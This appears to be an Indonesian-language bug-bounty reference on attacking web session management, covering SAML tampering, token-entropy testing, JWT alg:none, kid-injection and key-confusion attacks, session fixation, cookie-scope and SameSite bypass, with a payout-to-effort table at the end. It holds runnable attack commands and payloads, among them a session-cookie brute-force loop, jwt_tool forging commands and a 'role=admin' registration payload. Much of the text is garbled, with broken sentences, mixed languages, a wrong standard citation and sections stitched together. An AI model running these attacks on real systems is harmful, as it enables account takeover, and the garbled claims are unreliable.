* Versone: extension *"SAML Raider"* (Source: https://github.com/SAMLRaider), häufig kombiniert dengan *"SAML Encoder/Decoder"*.

Fitur:
| Fitur | Penggunaan di lapangan |
|---|---|
| Decoder plugin | Tampil/edit SAML XML; "Code", "Uncode/Decode" scripting? |
| Self-Sign | Klik "Self Sign" untuk mem-sign assertion dengan public IdP (sering di lapangan memakai self-sign — signature exclusion artinya cukup drop; oh well) |
| Signature view | Menunjukan digest method, canonicalization; kadang terlihat jumlah signed element |

# Referensi Teknik: Session Management

## 1. Token Entropy & Predictability

### 1.1 Menghitang Entropy Minimum

Token dianggap aman jika entropy efektif ≥ 64 bit (rekomendasi NIST SP 800-38B untuk random; OWASP ASVS 4.0.3 §3.2.1 minta ≥ 64 bit untuk session ID).

Formula:
```
entropy_bits = panjang_token_chars × log2(charset_size)
```

| Charset | log2 per char | Contoh panjang | Entropy |
|---|---|---|---|
| hex kecil (16 char) | 4 bit | 32 char | 128 bit |
| base64url (64 char) | 6 bit | 43 char | 258 bit (dibatasi PRNG) |
| numeric (10 char) | 3.32 bit | 16 digit | ~53 bit (**FAIL**) |

Deteksi pattern entropy rendah — kumpulkan sample lalu uji:

```bash
# Kumpulkan 1000 token dari respon login
for i in $(seq 1 1000); do
  curl -sk -c - -d "user=victim&pass=x" https://target/login \
    -o /dev/null -D - | grep -i set-cookie >> tokens.txt
done

# Entropy test dengan ent
cut -d' ' -f2 tokens.txt | cut -d';' -f1 | tr -d '\n' | ent -b
```

`ent` menampilkan "Entropy = X bits per byte". < 7.5 bits/byte berpattern/RNG jelek.

### 1.2 Pattern Umum yang Prediktabel

**Test case: numeric counter**
```
Login t1: Set-Cookie: SESSION=100004
Login t2: Set-Cookie: SESSION=100005
```
→ token berikutnya = 100006. Payload: forge langsung. Berhasil karena sequence monotonik.

**Test case: timestamp-based**
```
SESSION=1718000000-e4b5c
```
Bagian pertama = unix epoch detik (verifikasi: `date -d @1718000000`). Bagian kedua kemungkinan hash pendek dari `(time, user)`. Coba reproduksi:
```python
import time, hashlib
ts = 1718000000
for salt in ['user','secret','appid']:
    print(hashlib.md5(f"{ts}{salt}".encode()).hexdigest()[:5])
```
Cocok → predictable. Gagal bila salt tidak diketahui ( butuh oracle/leak).

**Test case: PHPSESSID setelah 3 sampel**
```
sess_abc123...  # 32 hex char = OK entropy
phpsess_a1b2    # 4 char = brute-force 65536 kombinasi
```
Brute force 4 char hex:
```bash
seq_demo() { for i in $(seq 0 65535); do python3 -c "print(hex($i)[2:].zfill(4))"; done | while read h; do
  curl -sb "SESSION=$h" https://target/profile | grep -q "Selamat datang" && echo "HIT: $h" && break
done; }
```

**Yang gagal di lapangan:** token terlihat pendek tapi backend melakukan lookup — 4 char bisa jadi ID ke tabel session di DB. Token panjang ≠ entropy tinggi (bisa saja `base64(md5(username + static_iv))` — deterministic per user, verifikasi login 2x dengan user sama, apa token identik?).

---

## 2. JWT vs Opaque Token

### 2.1 Matriks Perilaku

| Aspek | JWT (HS256) | Opaque |
|---|---|---|
| Introspeksi | Tidak perlu server call | Butuh `/introspect` atau DB lookup |
| Revocation | Sulit (stateless) | Trivial |
| Isi terlihat | Base64 = plaintext | Butuh oracle |

### 2.2 Test Decode

```bash
# Kirim
GET /api/profile HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...

# Yang muncul — decode tanpa verifikasi:
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
# {"alg":"HS256"}
echo $PAYLOAD_B64 | base64 -d 2>/dev/null | jq
# {"sub":"user","role":"user","exp":1718000000,"iss":"api"}
```

### 2.3 Verifikasi Signature Tanpa Secret (koleksi payload)

```bash
# jwt_tool — cek alg confusion, weak secret, kid injection
python3 jwt_tool.py <TOKEN> -M at  # tampering all values logged
python3 jwt_tool.py <TOKEN> -C -d rocks.txt  # crack HS256, wordlist
python3 jwt_tool.py <TOKEN> -X a  # alg:none attack
python3 jwt_tool.py <TOKEN> -X k  # kid injection: ../../dev/null
```

**Hasil `alg:none` saat beruntung:**
```
JWT yang dikirim: eyJhbGciOiJub25lIn9.PAYLOAD.   (header {"alg":"none"}, signature kosong)
Respon: HTTP/1.1 200 OK + data admin
```
Berhasil jika backend library lama (pyjwt < 1.5.0 era, node `jsonwebtoken` < 4.2.2) tidak memvalidasi alg whitelist.

### 2.4 Mengirim Kombinasi Confusion RS256→HS256

```bash
# Ambil public key dari endpoint (jwks.json atau cert TLS)
openssl s_client -connect target:443 2>/dev/null | openssl x509 -pubkey -noout > pub.pem
# Forge HS256 dengan public key sebagai HMAC secret
python3 jwt_tool.py <TOKEN> -X s -pk pub.pem
```
Respon `200` = backend memakai kunci publik RSA sebagai HMAC key (vuln klasik `jsonwebtoken` < 5.x konfigurasi salah, `PyJWT` lama tanpa `algorithms=...` eksplisit).

### 2.5 Opaque — Cari Oracle

Tidak bisa didecode. Yang dikirim: opaque token → `POST /api/refresh` atau semacamnya. Yang muncul harus diuji mutation:
```bash
curl -H "Authorization: Bearer $(echo $TOKEN | sed 's/$/a/')" https://target/api/me
```
Token+sufiks menerima → token di-truncate? Bandingkan behavior: 401 (baik) vs 200 (bug pembandingan). Ditemukan nyata: ada backend yang memakai prefix-match / hash di-truncate.

### 2.6 Penyimpanan Client-side

Uji apakah token disimpan di `localStorage` (JS is readable via XSS) vs `HttpOnly cookie`:
```bash
grep -zo 'localStorage.setItem[^"]*' https://target/static/js/app.*.js
```

---

## 3. Session Fixation

Alur uji:

1. Login. Perhatikan perubahan Set-Cookie.
2. Logout. Token masih ada? Token baru pasca-login lagi?
3. Dapatkan token pra-login:
```bash
curl -sk -D - https://target/ | grep -i set-cookie
```

### 3.1 Test Case: login tidak mengganti session

```
Tahap 1: GET /  →  Set-Cookie: PHPSESSID=attacker123
Tahap 2: kirim ke korban link: https://target/?PHPSESSID=attacker123
         (atau set cookie via subdomain-Cookie-throwing, atau XSS)
Tahap 3: korban login → cek apakah Set-Cookie mengirim nilai baru.
```
Respon login tidak mengirim `Set-Cookie: PHPSESSID=< BARU>` → value `attacker123` tetap dipakai → korban kini authenticated dengan session yang attacker ketahui → hijack.

### 3.2 RegistFixation

```bash
# Register endpoint anonim memberikan session
curl -c cookie.txt -d "user=user5&pass=user5" https://target/register
grep PHPSESSID cookie.txt
```
Jika `register.php` atau middleware memberikan SETANGKA VALUE sebelum login (locale, wishlist, tracking), dan nilai itu persist → fixation vector.

### 3.3 protected channel

`session.cookie_secure=0` → token terjadi di HTTP; kirim `Setuid-Cookie` hanya via HTTPS. Browser modern (Chrome memerlukan `Secure` untuk `SameSite=None`) tidak menulis insecure cookie — fixation via plain HTTPLOST di intranet dengan legacy IE-only org/dev option Try HSTS expiration.

---

## 4. Cookie Scope

Setelah login, catat:
```
Set-Cookie: SESSION=xxx; Domain=example.com;
         [...]
```

Setiap atribut yang tidak ada nilainya adalah attack surface.

| Atribut | Payload |
|---|---|
| `Domain=<...>` | Session cookie bisa dipakai `sub.example.com` |
| `HttpOnly` | Token dapat diakses JS → lewat XSS |
| `Secure` | Token bisa dikirim via HTTP → network capture |
| `hosts` | Misal: `Domain=.example.com` — attacker hosting |

### 4.1 Test Case: scope Domain

```
Cookie: Domain=.example.com
Try: apapun.example.com → login ke user.example.com, buka dev.example.com
Check: session cookie terpakai di semua host .example.com
Respon: kalau 200 (authenticated) → apapun subdomain dengan kontrol = adalah session swipe
```

Use case: `https://fake-domain-you-control.example.com` → XSS penuh maupun CSRF cookie DIDNOT need.

### 4.2 Test Case: Scope Path

```
Set-Cookie: SESSION=xxx; Path=/admin
Try: fetch('/admin.php') → apakah admin.php's admin-mts executes
Bypass: /admin/../isapi/etc
```

## 5. SameSite Bypass

### 5.1 Cek dulu header timing:
```
Set-Cookie: SESSION=xxx; Path=/
Set-Cookie: SESSION=xxx; Path=/; SameSite=Lax
Set-Cookie: SESSION=xxx; Path=/; SameSite=None ( → must have `Secure` or rejected)
```

### 5.2 Test Case: None + Secure (complete bypass)

**Target:** Kirim request "over-POST" dengan fetch/iframe/curl…Tanpa top-level navigation, directly wouldn't be sent without None.

**Stage A: assign - kalau ada header None treatment:**

Target: if `SameSite=None; Secure` — semua CSRF attack klasik viable (overall full).

**Stage B: Lax bypass - top-level navigation:**
Level: `POST form submission with forged values` won't get through (only GET).
Payload: `GET /transfer?to=attacker&amount=1000`` dengan click link (top-level GET). Kalau endpoint menerima GET mutations → bypass total because Lax allows top-level GET.
H,, GET + `_method=POST` override check also viable.

**Stage B2: Lax bypass via fresh cookie (Chrome 131 fix in place? that's ~2020 rollback window):}
Payload: site must place victim on site A, open a new browser → navigate to your malicious POST → iframe deep link structure cause any subsequent POST after <2 min will go since Lax-allowing POSTs on fresh-cookie 2-minute window.
**Test CaseAK:** buat cookie "fresh" — a spam POST immediately following session creation on target.com:
```
<p>Five payment option</p>
<a href="https://target.com/action">Click</a>
```
→ top-level GET sent complete cookie.
For JS first-touch: JS first-touch to set cookie instead of server response — if browser rolled it. Server response sets cookie as usual → in Chrome 131: Lax+POST blocked, but Chrome ever older: sent. Bila environment pengujian pakai Chrome 100 (legacy OS/org), testlabel true.

### 5.3 Test Case: SameSite tidak di-set
Default browser "Lax by default" — that header sama like Lax. If browser choice older → jarang support fix in 2024 enterprise: check Internal PCs via windows 10 build 17134, chrome 7x or `enterprise policy``CookiesLegacySameSiteBehaviorEnabledForDomainList` — check via `chrome://policy/` in screenshot repeat. kalau target domain listed → cookie header handled without SameSite → CSRF OK.

## 6. Session Puzzle ("Partial Token" / Condition Injection)

Skenario publik: user/guest login session → authenticated session — beberapa nilai tersimpan; bagian logika: `if session == EMPTY, user HAS not vest`. Sementara beberapa inherit data.

### Test-langkah:
1. **Login as ordinary attacker account** → observe session store values — look for user controllable fields (email, theme, locale….) (User ID stored at login)
2. **Logout** — apakah pattern clear? Cek `Set-Cookie` invalidation.
3. **Session value carryover:** register new account with attacker-set attribute → try login as guest but inherit preference keys → login as mild user, tamper payload param matching older user's `userid`
4. **Payload test:** address:
```
POST /step2
session-worker previously held ({vm:public-account}); param session_state="update"
↑ test param sets `publicID` CV → login later, look whether it inherited
```

### Concrete demo:
Two trial accounts: email `a@x.com` which is **admin approval pending** (role=user). Attempt to edit `user[role]=admin` via forgot-password reset flow via registration form `POST /register` where role param leak is typical:
```
POST /register
user=victim&pass=mang&role=admin
→ Set-Cookie: SESSION=abc123
mid-login flow: /step2 ["persist"]
username=victim

# Bab Referensi: Bug Class Payout-to-Effort 2026

Peringkat payout mengacu tren platform (HackerOne/Bugcrowt public disclosure Q4 2025) untuk target SaaS korporat dengan scope `*.example.com` wildcard. Skala effort: jam-person termasuk recon.

## 1. Payout-to-Effort Matrix

| Bug class | Payout tipikal (SaaS) | Effort | Rasio | Catatan |
|---|---|---|---|---|
| Subdomain takeover (dangling CNAME) | $1.800–$4.000 | 2–8 jam | ★★★★★ | Turun dari 2022; banyak platform sudah menutup registrasi otomatis |
| ATO chain ( kombinasi ❯ escalate) | $3.000–$15.000 | 1–3 minggu | ★★★★★ | Dianggap 1 chain, bukan beberapa bug |
| SSRF → cloud metadata | $2.500–$8.000 | 4–20 jam | ★★★★☆ | IMDSv2 & block metadata_option sudah standar; AWS makin sulit |
| Web cache deception (SaaS) | $1.000–$5.000 | 3–10 jam | ★★★☆☆ | Nginx/Fastly default berubah, perlu verifikasi cache key |
| Race condition limit overrun | $2.000–$10.000 | 8–40 jam | ★★★★☆ | Butuh infra (turbo, cloud bare-metal SG) |
| TOCTOU payment/coupon | $3.000–$20.000 | 10–60 jam | ★★★★☆ | Payout tertinggi di kelas logic, tapi legal area abu-abu — jangan selesaikan transaksi nyata |
| 2FA bypass | $1.500–$7.500 | 4–30 jam | ★★★★☆ | Ya.ru/WhatsApp reset flow masih goldmine |
| Business logic (price/qty manipulation) | $1.500–$10.000 | 4–24 jam | ★★★☆☆ | Rejected rate tinggi (54%) kalau tidak ada impact demonstrable |
